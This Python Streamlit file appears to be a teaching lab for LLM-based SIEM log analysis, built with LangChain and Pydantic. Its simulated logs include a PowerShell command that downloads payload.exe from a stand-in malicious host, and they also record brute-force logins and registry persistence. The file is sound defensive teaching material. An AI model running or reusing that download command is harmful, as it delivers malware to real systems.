# streamlit_siem_lab.py
# ---------------------------------------------------------------
# Lab: AI‑Powered SIEM Log Analysis (LangChain + Pydantic + LangSmith)
# ---------------------------------------------------------------
# What this app demonstrates
# 1) A Pydantic model (IncidentReport) defining the structured output we want
# 2) A prompt that instructs the LLM to act as a SOC analyst and return JSON matching the model
# 3) A LangChain Expression Language (LCEL) chain: Prompt -> LLM -> Pydantic parser
# 4) Execution on simulated SIEM logs
# 5) Streamlit UI for interaction + Analysis
# 6) LangSmith tracing hooks (set env vars to enable)
# ---------------------------------------------------------------

import os
import json
from datetime import datetime, timezone
from typing import List, Optional, Dict, Any

import pandas as pd
import streamlit as st

from pydantic import BaseModel, Field, ValidationError

# LangChain core + OpenAI
from langchain_core.prompts import ChatPromptTemplate
from langchain_core.output_parsers import PydanticOutputParser
from langchain_core.runnables import RunnableLambda, RunnableParallel
from langchain_openai import ChatOpenAI

from dotenv import load_dotenv
load_dotenv()
# ---------------------------------------------------------------
# Optional: LangSmith tracing (highly recommended for debugging)
# To enable, set the following environment variables before running:
#   export LANGCHAIN_TRACING_V2="true"
#   export LANGCHAIN_API_KEY="<your_langsmith_api_key>"
#   export LANGCHAIN_PROJECT="AI-Powered-SIEM-Lab"
# You can also set: os.environ[...] here if you want, but environment
# variables are preferred so they aren't hard-coded in the file.
# ---------------------------------------------------------------

# ---------------------------------------------------------------
# 1) Define the Pydantic model for the desired structured output
# ---------------------------------------------------------------
class Indicator(BaseModel):
    type: str = Field(description="Type of IOC, e.g., ip, domain, file_hash, user")
    value: str = Field(description="The indicator value")
    context: Optional[str] = Field(default=None, description="Short context of where/why this IOC appears")

class ExtractedEvent(BaseModel):
    timestamp: str = Field(description="ISO timestamp extracted from logs")
    source: str = Field(description="Log source, e.g., WindowsEvent, CloudTrail, Suricata")
    message: str = Field(description="Concise description of the event")
    severity: Optional[str] = Field(default=None, description="event-level severity if any")

class IncidentReport(BaseModel):
    incident_id: str = Field(description="Short ID you generate, e.g., INC-YYYYMMDD-###")
    severity: str = Field(description="LOW | MEDIUM | HIGH | CRITICAL")
    category: str = Field(description="E.g., Suspicious Login, Malware, Data Exfiltration, Reconnaissance")
    narrative_summary: str = Field(description="2-4 sentence human-readable summary of what happened and why it matters")
    root_cause: Optional[str] = Field(default=None, description="Probable root cause")
    impacted_hosts: List[str] = Field(default_factory=list, description="List of hostnames/IPs/accounts impacted")
    indicators: List[Indicator] = Field(default_factory=list, description="Extracted IOCs")
    extracted_events: List[ExtractedEvent] = Field(default_factory=list, description="Chronological significant events")
    recommended_actions: List[str] = Field(default_factory=list, description="Actionable remediation steps in priority order")
    confidence: int = Field(ge=0, le=100, description="0-100 confidence score in assessment")
    compliance_flags: List[str] = Field(default_factory=list, description="Relevant compliance/regulatory flags if any")
    start_time: Optional[str] = Field(default=None, description="Estimated incident start (ISO)")
    end_time: Optional[str] = Field(default=None, description="Estimated incident end (ISO)")
    references: Dict[str, Any] = Field(default_factory=dict, description="Any references like rule IDs, playbooks, links")


# ---------------------------------------------------------------
# 2) Prompt engineering — SOC analyst persona + strict format
# ---------------------------------------------------------------
parser = PydanticOutputParser(pydantic_object=IncidentReport)
format_instructions = parser.get_format_instructions()

SYSTEM_PROMPT = (
    "You are a meticulous Tier-2 SOC analyst. "
    "You ingest mixed SIEM logs and produce a structured incident report. "
    "Always extract concrete IOCs and significant events. Be cautious with certainty; prefer conservative severity. "
    "Return ONLY the JSON that matches the schema, no markdown fences."
)

prompt = ChatPromptTemplate.from_messages([
    ("system", SYSTEM_PROMPT),
    (
        "human",
        """
Context:
- You will be given raw SIEM logs from multiple sources.
- Analyze them for suspicious activity, inferred timeline, and likely root cause.

Instructions:
1) Think like a SOC analyst. Identify key events, IOCs, impacted entities.
2) Summarize the incident succinctly and recommend prioritized actions.
3) FOLLOW THIS OUTPUT SCHEMA EXACTLY (no extra keys, arrays, or prose):
{format_instructions}

Raw Logs (may contain multiple lines/records):
----------------
{logs_text}
----------------

Output:
Return ONLY valid JSON per the schema.
        """,
    ),
])

# ---------------------------------------------------------------
# 3) Build the LCEL Chain: Prompt -> LLM -> Pydantic Parser
# ---------------------------------------------------------------

def make_llm():
    """Construct the ChatOpenAI LLM.
    Requires OPENAI_API_KEY in env. You can change the model if desired.
    """
    return ChatOpenAI(
        model="gpt-4o-mini",
        temperature=0.2,
        timeout=60,
    )

llm = make_llm()

# RunnableParallel prepares variables for the prompt; here trivial but scalable.
prepare_inputs = RunnableParallel(
    format_instructions=RunnableLambda(lambda _: format_instructions),
    logs_text=RunnableLambda(lambda x: x["logs_text"]),
)

chain = prepare_inputs | prompt | llm | parser

# ---------------------------------------------------------------
# 4) Simulated SIEM logs (you can replace with your own)
# ---------------------------------------------------------------
SAMPLE_LOGS = """
2025-10-07T04:12:10Z WINDOWS-EVENT host=WIN-ACCT01 user=svc-backup event=4625 status=FAILED-LOGIN src_ip=185.199.110.153 details="Account failed to log on"
2025-10-07T04:12:15Z WINDOWS-EVENT host=WIN-ACCT01 user=svc-backup event=4625 status=FAILED-LOGIN src_ip=185.199.110.153 details="Account failed to log on"
2025-10-07T04:13:00Z WINDOWS-EVENT host=WIN-ACCT01 user=svc-backup event=4624 status=SUCCESS-LOGIN src_ip=185.199.110.153 details="An account was successfully logged on"
2025-10-07T04:13:20Z POWERSHELL host=WIN-ACCT01 user=svc-backup cmd="Invoke-WebRequest http://mal-dl.example.net/payload.exe -OutFile C:\\Temp\\px.exe"
2025-10-07T04:15:42Z SURICATA alert=ET MALWARE Possible EXE Download dst=WIN-ACCT01 src=185.199.110.153 url=http://mal-dl.example.net/payload.exe sha256=cafebabe1234deadbeef9999abc12345112233445566778899aabbccddeeff00
2025-10-07T04:17:03Z EDR host=WIN-ACCT01 proc=px.exe action=created persistence=RunKey path=HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\px
2025-10-07T04:18:35Z CLOUDTRAIL account=987654321 user=svc-backup action=ListBuckets source_ip=185.199.110.153 userAgent=PowerShell/7.4.3
2025-10-07T04:19:11Z CLOUDTRAIL account=987654321 user=svc-backup action=GetObject bucket=finance-reports key=q3/bonus.xlsx bytes=10485760 status=200
"""

# ---------------------------------------------------------------
# 5) Streamlit UI
# ---------------------------------------------------------------
st.set_page_config(page_title="AI-Powered SIEM Log Analysis", page_icon="🛡️", layout="wide")

st.title("🛡️ Lab: AI‑Powered SIEM Log Analysis")
st.caption("LangChain + Pydantic structured output + LangSmith tracing (optional)")

with st.sidebar:
    st.header("Configuration")
    st.markdown(
        "Set the following environment variables before running:"
    )
    st.code(
        """
export OPENAI_API_KEY=...           # required
export OPENAI_MODEL=gpt-4o-mini     # optional (default shown)
export LANGCHAIN_TRACING_V2=true    # optional
export LANGCHAIN_API_KEY=...        # optional (for LangSmith)
export LANGCHAIN_PROJECT=AI-Powered-SIEM-Lab  # optional
        """,
        language="bash",
    )
    model = "gpt-4o-mini"
    st.write(f"**Model:** {model}")

st.subheader("1) Provide SIEM Logs")
col1, col2 = st.columns([2, 1])
with col1:
    uploaded = st.file_uploader("Upload log file (.txt, .log, .csv)", type=["txt", "log", "csv"], accept_multiple_files=False)
with col2:
    use_sample = st.toggle("Use sample logs", value=(uploaded is None))

logs_text = ""

if uploaded is not None:
    fname = uploaded.name.lower()
    if fname.endswith(".csv"):
        try:
            df_up = pd.read_csv(uploaded)
            # Prefer a 'raw_log' column if present
            if "raw_log" in df_up.columns:
                logs_text = "".join(df_up["raw_log"].astype(str).tolist())
            else:
                # Fallback: attempt to construct a raw line per row
                def row_to_line(row):
                    if "timestamp" in df_up.columns:
                        ts = row["timestamp"]
                    else:
                        # Use timezone-aware UTC timestamp
                        ts = datetime.now(timezone.utc).isoformat()
                    source = row.get("source", "GENERIC") if hasattr(row, "get") else (row["source"] if "source" in df_up.columns else "GENERIC")
                    parts = []
                    for col in df_up.columns:
                        if col in ["timestamp", "source", "raw_log"]:
                            continue
                        parts.append(f"{col}={row[col]}")
                    return f"{ts} {source} " + " ".join(parts)
                logs_text = "".join(row_to_line(r) for _, r in df_up.iterrows())
            st.success("CSV uploaded. Preview below.")
            st.dataframe(df_up.head(20), use_container_width=True)
        except Exception as e:
            st.error("Failed to read CSV. Ensure it's valid and try again.")
            st.exception(e)
    else:
        # Treat as plain text log file
        try:
            content = uploaded.read()
            logs_text = content.decode("utf-8", errors="replace")
            # Show a small preview
            st.success("Text log uploaded. Showing first 20 lines.")
            preview_lines = "".join(logs_text.splitlines()[:20])
            st.code(preview_lines)
        except Exception as e:
            st.error("Failed to read text file.")
            st.exception(e)

if use_sample and not logs_text:
    logs_text = SAMPLE_LOGS.strip()

if not logs_text:
    st.info("Provide logs (upload file or enable sample logs) to proceed.")
    st.stop()

st.divider()
st.subheader("2) Run the Analysis Chain")
run_btn = st.button("🔎 Analyze Logs", type="primary")

if run_btn:
    with st.spinner("Running LLM chain and parsing output..."):
        try:
            # Invoke the LCEL chain with our logs
            report: IncidentReport = chain.invoke({"logs_text": logs_text})
            st.success("Structured incident report generated.")
        except ValidationError as ve:
            st.error("Pydantic validation failed. See details below.")
            st.exception(ve)
            st.stop()
        except Exception as e:
            st.error("Chain execution failed. See details below.")
            st.exception(e)
            st.stop()

    # Pretty JSON and tabbed UI
    tabs = st.tabs(["📄 Report (JSON)", "📊 Analysis"]) 

    with tabs[0]:
        st.json(json.loads(report.model_dump_json()))

    # ------------------------------------------
    # Analysis from the structured output
    # ------------------------------------------
    with tabs[1]:
        st.markdown("### Indicators of Compromise (IOCs)")
        if report.indicators:
            ioc_df = pd.DataFrame([ioc.model_dump() for ioc in report.indicators])
            # Basic counts by type
            type_counts = ioc_df["type"].value_counts().reset_index()
            type_counts.columns = ["type", "count"]
            st.bar_chart(type_counts.set_index("type"), height=300, width=100)
            st.dataframe(ioc_df)
        else:
            st.info("No indicators extracted.")

        st.markdown("### Timeline of Extracted Events")
        if report.extracted_events:
            ev_df = pd.DataFrame([e.model_dump() for e in report.extracted_events])
            # Ensure sortable datetime
            try:
                ev_df["timestamp"] = pd.to_datetime(ev_df["timestamp"], errors="coerce")
                ev_df = ev_df.sort_values("timestamp")
            except Exception:
                pass
            # Render a scatter plot of event occurrences over time
            ev_df["event_count"] = 1
            # st.scatter_chart(ev_df.set_index("timestamp")[["event_count"]])
            ev_df["event_count"] = 1
            # st.line_chart(ev_df.set_index("timestamp")["event_count"])
            st.dataframe(ev_df, use_container_width=True)
        else:
            st.info("No events extracted.")

        st.markdown("### Impacted Hosts / Accounts")
        if report.impacted_hosts:
            hosts_df = pd.DataFrame({"impacted": report.impacted_hosts})
            st.dataframe(hosts_df, use_container_width=True)
        else:
            st.info("No impacted entities listed.")

        # --------------------
        # Recommended actions
        # --------------------
        st.markdown("### Recommended Actions / Remediation")
        if report.recommended_actions:
            # Show as an ordered (priority) list inside an expander
            with st.expander("Show recommended actions (priority order)", expanded=True):
                for idx, action in enumerate(report.recommended_actions, start=1):
                    st.markdown(f"{idx}. {action}")

            # Also offer the raw JSON array for easy copying/integration
            st.markdown("**JSON (copyable)**")
            st.code(json.dumps(report.recommended_actions, indent=2), language="json")
        else:
            st.info("No recommended actions provided by the analysis.")

   